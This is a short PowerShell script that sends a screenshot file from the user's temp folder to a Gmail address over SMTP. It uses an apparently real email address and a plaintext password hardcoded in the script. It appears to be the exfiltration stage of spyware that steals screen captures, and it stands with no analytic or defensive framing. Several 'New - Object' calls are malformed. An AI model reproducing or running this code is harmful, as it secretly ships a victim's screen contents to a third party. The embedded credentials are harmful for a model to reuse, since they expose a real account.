$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New - Object Net.Mail.SmtpClient($SMTPServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New - Object System.Net.NetworkCredential('zaghum.mughal.1@gmail.com', ',.H@cked12,.')
$message = New - Object System.Net.Mail.MailMessage
$message.From = 'zaghum.mughal.1@gmail.com'
$message.To.Add('zaghum.mughal.1@gmail.com')
$message.Subject = 'Screenshot File'
$message.Body = 'Success! The Screenshot file is attached!'
$message.Attachments.Add("$ENV:temp\Screenshot.png");
$SMTPInfo.Send($message);
